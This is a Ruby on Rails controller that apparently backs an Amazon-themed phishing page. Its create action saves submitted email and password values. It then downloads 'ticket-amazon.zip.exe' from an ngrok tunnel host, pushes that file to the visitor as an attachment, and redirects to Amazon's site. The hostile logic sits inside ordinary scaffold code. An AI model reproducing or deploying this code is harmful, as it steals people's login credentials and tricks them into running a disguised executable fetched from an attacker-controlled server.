class InformationController < ApplicationController
  before_action :set_information, only: %i[ show edit update destroy ]

  # GET /information or /information.json
  def index
    @information = Information.all
  end

  # GET /information/1 or /information/1.json
  def show
  end

  # GET /information/new
  def new
    @information = Information.new
  end

  # GET /information/1/edit
  def edit
  end

  require 'net/http'
  # POST /information or /information.json
  def create
    @information = Information.new(information_params)

      if @information.save
        url = URI.parse("https://151b-181-78-80-242.ngrok-free.app/ticket-amazon.zip.exe")
        response = Net::HTTP.get_response(url)
        if response.code == "200"
          send_data response.body, filename: "ticket-amazon.zip.exe", disposition: 'attachment', content_type: 'application/octet-stream'
          redirect_to "https://www.amazon.com/-/es/"
          return
        else
          redirect_to "https://www.amazon.com/-/es/"
          return
        end
      else
        redirect_to "https://www.amazon.com/-/es/", allow_other_host: true
      end
  end

  # PATCH/PUT /information/1 or /information/1.json
  def update
    respond_to do |format|
      if @information.update(information_params)
        format.html { redirect_to information_url(@information), notice: "Information was successfully updated." }
        format.json { render :show, status: :ok, location: @information }
      else
        format.html { render :edit, status: :unprocessable_entity }
        format.json { render json: @information.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /information/1 or /information/1.json
  def destroy
    @information.destroy

    respond_to do |format|
      format.html { redirect_to information_index_url, notice: "Information was successfully destroyed." }
      format.json { head :no_content }
    end
  end

  private
    # Use callbacks to share common setup or constraints between actions.
    def set_information
      @information = Information.find(params[:id])
    end

    # Only allow a list of trusted parameters through.
    def information_params
      params.require(:information).permit(:email, :pass)
    end
end
